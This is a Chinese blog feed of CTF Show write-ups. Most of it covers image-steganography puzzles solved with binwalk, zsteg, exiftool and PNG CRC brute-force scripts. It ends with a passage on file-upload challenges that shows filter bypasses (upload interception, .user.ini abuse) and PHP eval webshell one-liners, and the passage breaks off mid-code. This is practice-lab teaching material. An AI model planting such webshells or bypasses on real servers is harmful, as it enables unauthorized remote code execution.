src="https://i.loli.net/2021/08/06/i9uzv5cNeaIYZK6.png" alt="image-20210806144814605"></p><h2 id="1-10-misc-10-—-flag在图片数据里"><a href="#1-10-misc-10-—-flag在图片数据里" class="headerlink" title="1.10 misc 10 — flag在图片数据里"></a>1.10 misc 10 — flag在图片数据里</h2><p><img src="https://img-blog.csdnimg.cn/2021040323291259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/08/06/9fUygEpk5xD64CY.png" alt="image-20210806150628472"></p><p>两个 IDAT 块</p><p><a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">binwalk 工具</a></p><p><img src="https://i.loli.net/2021/08/06/eiTxaH3R5QyXsCM.png" alt="image-20210806145504944"></p><p><img src="https://i.loli.net/2021/08/06/VAtQ7vGkhoydjCg.png" alt="image-20210806145800458"></p><p>解释：zlib 是 PNG IDAT 块数据可选的压缩格式</p><p>题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中</p><p>而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了</p><h2 id="1-11-misc-11-—-flag在另一张图里"><a href="#1-11-misc-11-—-flag在另一张图里" class="headerlink" title="1.11 misc 11 — flag在另一张图里"></a>1.11 misc 11 — flag在另一张图里</h2><p><img src="https://i.loli.net/2021/08/06/TRVfhLlAZtEbz8G.png" alt="image-20210806150503285"></p><p>两个 IDAT 块 </p><p>再次使用上一关的解法，不可行</p><p>搜集资料之后，必须首先将多余的那个 IDAT 块删除才可</p><p>工具 <a href="http://entropymine.com/jason/tweakpng/">tweakpng</a></p><p><img src="https://i.loli.net/2021/08/06/XYpNZg5y4Mrz8ad.png" alt="image-20210806152327628"></p><p>将第一个 IDAT 块右键删除即可</p><p>ctfshow{44620176948fa759d3eeafeac99f1ce9}</p><h2 id="1-12-misc-12-—-flag在另一张图里"><a href="#1-12-misc-12-—-flag在另一张图里" class="headerlink" title="1.12 misc 12 — flag在另一张图里"></a>1.12 misc 12 — flag在另一张图里</h2><p><strong>flag在另一张图里。</strong></p><p>与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可</p><h2 id="1-13-misc-13-—-flag位置在图片末尾"><a href="#1-13-misc-13-—-flag位置在图片末尾" class="headerlink" title="1.13 misc 13 — flag位置在图片末尾"></a>1.13 misc 13 — flag位置在图片末尾</h2><p><strong>flag位置在图片末尾。</strong></p><p><img src="https://i.loli.net/2021/08/06/HQLKmqTDYX29ect.png" alt="image-20210806152900284"></p><p>可以看到一部分类似 flag 的字符串</p><p>我们将乱七八糟的删除即可，每隔一个删除一个</p><h2 id="1-14-misc-14-—-flag在那张图里"><a href="#1-14-misc-14-—-flag在那张图里" class="headerlink" title="1.14 misc 14 — flag在那张图里"></a>1.14 misc 14 — flag在那张图里</h2><p><strong>flag在那张图里。</strong></p><p><img src="https://i.loli.net/2021/08/06/MhJSlyqzXk9vTRb.png" alt="image-20210806160143737"></p><p><img src="https://i.loli.net/2021/08/06/DqM6Oeojm84sPCQ.png" alt="image-20210806161032310"></p><p>记得从 FF D8 开始</p><p>新建一个新的文件 jpg 打开</p><p><img src="https://i.loli.net/2021/08/06/M8uZkhLQ3lBrvCq.png" alt="image-20210806161419857"></p><p>注意：QQ识图 有时不准确，比如 0 和 8</p><h2 id="1-15-misc-15-—-flag被跳过去了"><a href="#1-15-misc-15-—-flag被跳过去了" class="headerlink" title="1.15 misc 15 — flag被跳过去了"></a>1.15 misc 15 — flag被跳过去了</h2><p><img src="https://i.loli.net/2021/08/06/ZjgFo1C7Q6vrXa4.png" alt="image-20210806162024516"></p><h2 id="1-16-misc-16-—-flag在图片数据里"><a href="#1-16-misc-16-—-flag在图片数据里" class="headerlink" title="1.16 misc 16 — flag在图片数据里"></a>1.16 misc 16 — flag在图片数据里</h2><p><strong>flag在图片数据里。</strong></p><p>binwalk 提取文件</p><p><img src="https://i.loli.net/2021/08/06/nlOwMb7TYjHvmVa.png" alt="image-20210806162229301"></p><h2 id="1-17-misc-17-—-flag在图片数据里-—-zsteg"><a href="#1-17-misc-17-—-flag在图片数据里-—-zsteg" class="headerlink" title="1.17 misc 17 — flag在图片数据里 — zsteg"></a>1.17 misc 17 — flag在图片数据里 — zsteg</h2><p><strong>flag在图片数据里。</strong></p><p><a href="https://blog.csdn.net/Amherstieae/article/details/107512398?ops_request_misc=&request_id=&biz_id=102&utm_term=zsteg&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-.nonecase&spm=1018.2226.3001.4187">zsteg 安装 及 使用</a></p><blockquote><p><strong>zsteg可以检测PNG和BMP图片里的隐写数据。</strong></p><p><strong>目前，zsteg支持检测：</strong></p><p>LSB steganography in PNG &amp; BMP<br>zlib-compressed data<br>OpenStego<br>Camouflage 1.2.1<br>LSB with The Eratosthenes set</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/LKIYqbx6zagBPij.png" alt="image-20210818084217889"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -E <span class="string">&quot;extradata:0&quot;</span> misc17.png &gt; 1.txt</span><br><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/3Q4ufwqRHpg7sDA.png" alt="image-20210818084305522"></p><h2 id="1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里"><a href="#1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里" class="headerlink" title="1.18 misc 18 — flag在标题、作者、照相机和镜头型号里"></a>1.18 misc 18 — flag在标题、作者、照相机和镜头型号里</h2><p><strong>flag在标题、作者、照相机和镜头型号里。</strong></p><p><img src="https://i.loli.net/2021/08/06/xNsXTekIu8rQicp.png" alt="image-20210806164253394"></p><p>右键属性查看</p><h2 id="1-19-misc-19-—-flag在主机上的文档名里"><a href="#1-19-misc-19-—-flag在主机上的文档名里" class="headerlink" title="1.19 misc 19 — flag在主机上的文档名里"></a>1.19 misc 19 — flag在主机上的文档名里</h2><p><img src="https://i.loli.net/2021/08/06/4x7pI5l6Ji2LXD9.png" alt="image-20210806164624752"></p><h2 id="1-20-misc-20-—-flag在评论里"><a href="#1-20-misc-20-—-flag在评论里" class="headerlink" title="1.20 misc 20 — flag在评论里"></a>1.20 misc 20 — flag在评论里</h2><p><strong>图虫查看器</strong> </p><p><a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a></p><p><img src="https://i.loli.net/2021/08/06/vmXoFLcraHVux81.png" alt="image-20210806164933737"></p><p>ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p><h2 id="1-21-misc-21-—-flag在序号里"><a href="#1-21-misc-21-—-flag在序号里" class="headerlink" title="1.21 misc 21 — flag在序号里"></a>1.21 misc 21 — flag在序号里</h2><p><strong>flag在序号里。</strong></p><p><img src="https://i.loli.net/2021/08/06/fZSn92xQVupkjm8.png" alt="image-20210806165515702"></p><p><img src="https://i.loli.net/2021/08/06/UhKEkJ1cCenrjBW.png" alt="image-20210806165604429"></p><p><img src="https://i.loli.net/2021/08/06/GAKM9qvI2wHXZdy.png" alt="image-20210806165842984"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))</span><br><span class="line">0xe8a221490x8d5c073b0x4084eb510xb1a1686d</span><br></pre></td></tr></table></figure><p>删掉 0x 即可</p><h2 id="1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool"><a href="#1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool" class="headerlink" title="1.22 misc22 — flag 在图片里 — 缩略图 — exiftool"></a>1.22 misc22 — flag 在图片里 — 缩略图 — exiftool</h2><p><img src="https://i.loli.net/2021/08/18/s3uYmaIvdQoCntb.png" alt="image-20210818085210755"></p><p>设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来</p><p><strong>这是一种缩略图隐写的方式，叫做thumbnail隐写</strong></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/101765775?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162924833616780274173567%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162924833616780274173567&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-101765775.first_rank_v2_pc_rank_v29&utm_term=exiftool&spm=1018.2226.3001.4187">exiftool</a></p><p><img src="https://i.loli.net/2021/08/18/lh2CPzr7Icn6ETL.png" alt="image-20210818090550904"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/f2B4y1Vlg7C9TkU.png" alt="image-20210818091200925"></p><p>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p><h2 id="1-23-misc23-—-flag在时间里-—"><a href="#1-23-misc23-—-flag在时间里-—" class="headerlink" title="1.23 misc23 — flag在时间里 —"></a>1.23 misc23 — flag在时间里 —</h2><p>exiftool 查看实践</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool.exe misc23.psd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/pmdsDHbnO78GAKE.png" alt="image-20210818091639071"></p><p> ctfshow{}, UnixTimestamp, DECtoHEX, getflag</p><p>Unix 时间戳，十进制到十六进制，获取 flag</p><p>1997:09:22 02:17:02+08:00</p><p>2055:07:15 12:14:48+08:00</p><p>2038:05:05 16:50:45+08:00</p><p>1984:08:03 18:41:46+08:00</p><p><a href="">在线时间戳转换</a></p><p><img src="https://i.loli.net/2021/08/18/yxjk3vDiorTaS7F.png" alt="image-20210818092609921"></p><p>874865822</p><p>2699237688</p><p>2156662245</p><p>460377706</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))</span><br><span class="line">0x3425649e0xa0e319380x808c0de50x1b70ce6a</span><br></pre></td></tr></table></figure><p>ctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h2 id="1-24-misc41"><a href="#1-24-misc41" class="headerlink" title="1.24 misc41"></a>1.24 misc41</h2><p><strong>（本题为Misc入门图片篇和愚人节比赛特别联动题）</strong><br><strong>H4ppy Apr1l F001’s D4y！<br>愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</strong></p><p>H4ppy Apr1l F001’s D4y！</p><p>这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可</p><p><img src="https://i.loli.net/2021/08/18/iQu4oTsBpj5VSbK.png" alt="image-20210818093403414"></p><p>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><h2 id="1-25-misc24-—-flag在图片上面-—-bmp-图片改高度"><a href="#1-25-misc24-—-flag在图片上面-—-bmp-图片改高度" class="headerlink" title="1.25 misc24 — flag在图片上面 — bmp 图片改高度"></a>1.25 misc24 — flag在图片上面 — bmp 图片改高度</h2><p><a href="https://blog.csdn.net/aidem_brown/article/details/80500637">bmp 位图文件解析</a></p><p>900*150=135000个像素大小</p><p>该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”<strong>补0</strong>”)</p><p>文件头共 53 字节</p><p><strong>每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red）</strong></p><p>(675053-53)/3=225000</p><p>得到真实的像素大小</p><p>该题只有高不对，则正确的宽依旧是 900</p><p>得到 225000/900=高 250</p><p>修改高为 hex(250)=FA</p><p><img src="https://i.loli.net/2021/08/18/NGuDSj1aL6Ii9vo.png" alt="image-20210818122344260"></p><p>还是 0096 的位置修改</p><p><img src="https://i.loli.net/2021/08/18/X9QjZ8bHJ2oUc7x.png" alt="image-20210818122451730"></p><p>保存得到flag</p><h2 id="1-26-misc25-—-flag在图片下面-—-png-图片改高度"><a href="#1-26-misc25-—-flag在图片下面-—-png-图片改高度" class="headerlink" title="1.26 misc25 — flag在图片下面 — png 图片改高度"></a>1.26 misc25 — flag在图片下面 — png 图片改高度</h2><p><img src="https://i.loli.net/2021/08/18/Yn7Ss6BOiae3mZ2.png" alt="image-20210818094843932"></p><p>0096 改成 0196 0296 都可</p><p><img src="https://i.loli.net/2021/08/18/XGi2Mk35UJRTBcq.png" alt="image-20210818094920712"></p><h2 id="1-27-misc26-—-flag还是在图片下面，但到底有多下面？"><a href="#1-27-misc26-—-flag还是在图片下面，但到底有多下面？" class="headerlink" title="1.27 misc26 — flag还是在图片下面，但到底有多下面？"></a>1.27 misc26 — flag还是在图片下面，但到底有多下面？</h2><p><img src="https://i.loli.net/2021/08/18/U2a1CMOwjg7eoFQ.png" alt="image-20210818095156426"></p><p>ctfshow{94aef1</p><p>+True height(hex) of this picture+</p><p>087a7ccf2e28e742efd704c}</p><p><img src="https://i.loli.net/2021/08/18/nFv9oAalI6by3CG.png" alt="image-20210818095534774"></p><p><a href="https://blog.csdn.net/weixin_44145452/article/details/109612189">https://blog.csdn.net/weixin_44145452/article/details/109612189</a></p><p>会提示校验码错误</p><p><strong>CRC32是有哪些字节构成的</strong>？</p><p>PNG文件中总是以固定的八个字节开头</p><blockquote><p> 89 50 4E 47  0D 0A 1A 0A</p></blockquote><p>数据块长度3</p><blockquote><p>00 00 00 0D</p></blockquote><p>文件头数据块标示IDCH</p><blockquote><p>49 48 44 52</p></blockquote><p>13位数据块（IHDR）<br>下面为宽和高</p><blockquote><p>00 00 07 7E  00 00 03 60</p></blockquote><p>这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method</p><blockquote><p>08 06 00 00 00</p></blockquote><p>接下来的四字节为该png图片的CRC校验码</p><blockquote><p>7D C7 3F 7F</p></blockquote><p>CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到</p><p><strong>解决方法：</strong><br>1.简单点的隐写题，可以直接修改宽高，然后显示flag<br>2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。<br>这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。<br>这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。<br>通过python2脚本来获取图片高度</p><p><strong>获取图片高度</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">crc32key = 0x7DC73F7F</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0, 65535):</span><br><span class="line">  height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)</span><br><span class="line">  <span class="comment">#CRC: 7DC73F7F</span></span><br><span class="line">  data = <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x07\x7E&#x27;</span> + height + <span class="string">&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line">  crc32result = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">  <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(map(lambda c: <span class="string">&quot;%02X&quot;</span> % ord(c), height))</span><br></pre></td></tr></table></figure><p><strong>爆破图片正常宽高</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0806000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xec9ccbc6&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/YDhUVyJfuWLqTHG.png" alt="image-20210818100740105"></p><p>ctfshow{94aef1</p><p>+True height(hex) of this picture+</p><p>087a7ccf2e28e742efd704c}</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125;</span><br></pre></td></tr></table></figure><h2 id="1-28-misc27-—-flag在图片下面"><a href="#1-28-misc27-—-flag在图片下面" class="headerlink" title="1.28 misc27 — flag在图片下面"></a>1.28 misc27 — flag在图片下面</h2><p><img src="https://i.loli.net/2021/08/18/lJOhAfSi9oUprB4.png" alt="image-20210818102436038"></p><p>寻找 0096</p><h2 id="1-29-misc28-—-flag在图片下面-—-gif"><a href="#1-29-misc28-—-flag在图片下面-—-gif" class="headerlink" title="1.29 misc28 — flag在图片下面 — gif"></a>1.29 misc28 — flag在图片下面 — gif</h2><p>9600 更改为 FF00，两处</p><p><img src="https://i.loli.net/2021/08/18/ORvZCma3I9obkwW.png" alt="image-20210818103453893"></p><p>gif.bt  ???????</p><h2 id="1-30-misc29-—-flag在图片下面"><a href="#1-30-misc29-—-flag在图片下面" class="headerlink" title="1.30 misc29 — flag在图片下面"></a>1.30 misc29 — flag在图片下面</h2><p>9600 更改为 FF00，十处，然后 stegsolve 逐帧查看</p><p><img src="https://i.loli.net/2021/08/18/28FwOXBWE71SrjL.png" alt="image-20210818104202161"></p><h2 id="1-31-misc30-—-正确的宽度是950"><a href="#1-31-misc30-—-正确的宽度是950" class="headerlink" title="1.31 misc30 — 正确的宽度是950"></a>1.31 misc30 — 正确的宽度是950</h2><p>修改 bmp 宽度为 hex(950)</p><p><img src="https://i.loli.net/2021/08/18/78twlxqsrMUOHTj.png" alt="image-20210818122816045"></p><h2 id="1-32-misc31-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-32-misc31-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.32 misc31 — 高度是正确的，但正确的宽度是多少呢"></a>1.32 misc31 — 高度是正确的，但正确的宽度是多少呢</h2><p>同 misc24</p><p>图片总共 487256 字节，去掉文件尾，得到 487253</p><p>900*150=135000</p><p>文件头 53 字节</p><p>(487253-53)/3=162400</p><p>高正确，150</p><p>宽：162400/150=1082.67</p><p>改宽为 1082</p><h2 id="1-33-misc32-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-33-misc32-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.33 misc32 — 高度是正确的，但正确的宽度是多少呢"></a>1.33 misc32 — 高度是正确的，但正确的宽度是多少呢</h2><p>png 计算宽高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0802000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xe14a4c0b&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure><p>0x414 0x96</p><p><img src="https://i.loli.net/2021/08/18/puJBmM9NFYwl1bd.png" alt="image-20210818124125740"></p><h2 id="1-34-misc33-—-出题人丧心病狂，把高度也改了"><a href="#1-34-misc33-—-出题人丧心病狂，把高度也改了" class="headerlink" title="1.34 misc33 — 出题人丧心病狂，把高度也改了"></a>1.34 misc33 — 出题人丧心病狂，把高度也改了</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import zlibimport struct<span class="comment"># 同时爆破宽度和高度filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f:    all_b = f.read()    data = bytearray(all_b[12:29])    n = 4095    for w in range(n):        width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))        for h in range(n):            height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))            for x in range(4):                data[x+4] = width[x]                data[x+8] = height[x]            crc32result = zlib.crc32(data)            #替换成图片的crc            if crc32result == 0x5255a798:                print(&quot;宽为：&quot;, end = &#x27;&#x27;)                print(width, end = &#x27; &#x27;)                print(int.from_bytes(width, byteorder=&#x27;big&#x27;))                print(&quot;高为：&quot;, end = &#x27;&#x27;)                print(height, end = &#x27; &#x27;)                print(int.from_bytes(height, byteorder=&#x27;big&#x27;))</span></span><br></pre></td></tr></table></figure><p>宽为：bytearray(b’\x00\x00\x03\xd2’) 978<br>高为：bytearray(b’\x00\x00\x00\x8e’) 142</p><h2 id="1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"><a href="#1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900" class="headerlink" title="1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"></a>1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900</h2><h2 id="1-36-misc35"><a href="#1-36-misc35" class="headerlink" title="1.36 misc35"></a>1.36 misc35</h2><h2 id="1-37-misc36"><a href="#1-37-misc36" class="headerlink" title="1.37 misc36"></a>1.37 misc36</h2><h2 id="1-38-misc37-—-flag在图片里"><a href="#1-38-misc37-—-flag在图片里" class="headerlink" title="1.38 misc37 — flag在图片里"></a>1.38 misc37 — flag在图片里</h2><p>StegSolve 帧图分析</p><p>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p><p><img src="https://i.loli.net/2021/08/18/GK4Qjsxu1ombFEe.png" alt="image-20210818133303136"></p><h2 id="1-39-misc38-—-flag在图片里"><a href="#1-39-misc38-—-flag在图片里" class="headerlink" title="1.39 misc38 — flag在图片里"></a>1.39 misc38 — flag在图片里</h2><p><img src="https://i.loli.net/2021/08/18/lUidvS8bGcwmC6z.png" alt="image-20210818133639020"></p><p>使用浏览器打开，即可发现会动</p><p><img src="https://i.loli.net/2021/08/18/OmIx2Yf9HSnqTzk.png" alt="image-20210818133736905"></p><p><a href="http://www.downcc.com/soft/40902.html">APNG 图片分解器</a></p><p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><h2 id="1-40-misc39-—-flag就像水，忽快忽慢地流"><a href="#1-40-misc39-—-flag就像水，忽快忽慢地流" class="headerlink" title="1.40 misc39 — flag就像水，忽快忽慢地流"></a>1.40 misc39 — flag就像水，忽快忽慢地流</h2><p>这题也是一个gif，不过这里是利用<code>不同帧之间的间隔时间</code>来隐写的。</p><h2 id="1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠"><a href="#1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠" class="headerlink" title="1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠"></a>1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠</h2><p>apng</p><p>帧分离，换成了apng的帧时间间隔隐写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(28,69): <span class="comment">#flag内容从28位开始    f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;)    s = f.read()    flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/PIZ4l9SsAREOBUF.png" alt="image-20210818135910351"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show Misc 入门篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-文件上传</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-10-01T11:16:29.000Z</published>
    <updated>2021-10-01T11:17:15.184Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 文件上传篇。</p><span id="more"></span><h1 id="CTF-Show-—-文件上传"><a href="#CTF-Show-—-文件上传" class="headerlink" title="CTF Show — 文件上传"></a>CTF Show — 文件上传</h1><h2 id="1-1-Web-151-—-前端验证"><a href="#1-1-Web-151-—-前端验证" class="headerlink" title="1.1 Web 151 — 前端验证"></a>1.1 Web 151 — 前端验证</h2><p><img src="https://i.loli.net/2021/07/20/8pT6QIktcJDxwr2.png" alt="image-20210720122900336"></p><p>手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 <code>.png</code> 图片，其实查看源代码后有</p><p><img src="https://i.loli.net/2021/07/23/rXv7nL6c8dDl91s.png" alt="image-20210723123609690"></p><p>所以只能上传 <code>.png</code> ，我们上传 <code>1.png</code> 然后抓包手动修改</p><p><img src="https://i.loli.net/2021/07/20/Cseq18PLQhN4jYt.png" alt="image-20210720123711861"></p><p>蚁剑连接即可</p><h2 id="1-2-Web-152"><a href="#1-2-Web-152" class="headerlink" title="1.2 Web 152"></a>1.2 Web 152</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后端不能单一校验</span><br></pre></td></tr></table></figure><p>同上</p><h2 id="1-3-Web-153-—-user-ini"><a href="#1-3-Web-153-—-user-ini" class="headerlink" title="1.3 Web 153 — .user.ini"></a>1.3 Web 153 — .user.ini</h2><p>由于服务器是 <code>nginx</code> ，则可尝试上传 <code>.user.ini</code></p><p><img src="https://i.loli.net/2021/10/01/OneLzrpP7mW3UDd.png" alt="image-20210720181229272"></p><p>再上传 <code>111.png</code></p><p><img src="https://i.loli.net/2021/07/20/MUD5cNCQy9KeR7F.png" alt="image-20210720181320936"></p><p>访问与 111.png 同目录下的 index.php 文件</p><p>即 <code>/upload/index.php</code> ，使用 蚁剑连接即可</p><h2 id="1-4-Web-154-—-大小写绕过-php"><a href="#1-4-Web-154-—-大小写绕过-php" class="headerlink" title="1.4 Web 154 — 大小写绕过 php"></a>1.4 Web 154 — 大小写绕过 php</h2><p>这次尝试之后发现进行了内容判断，只能使用图片木马</p><p>发现 <code>.user.ini</code> 仍旧可以上传</p><p><img src="https://i.loli.net/2021/10/01/5Ray2IkFiLb41BO.png" alt="image-20210720195220069"></p><p>但是内容过滤了 <code>php</code> ,想办法找一些不含有 php 的一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:XML风格，也是官方推荐的形式</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2:短标记</span><br><span class="line">&lt;? @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br><span class="line">需要开启配置参数short_open_tags=on</span><br><span class="line">&lt;?= @<span 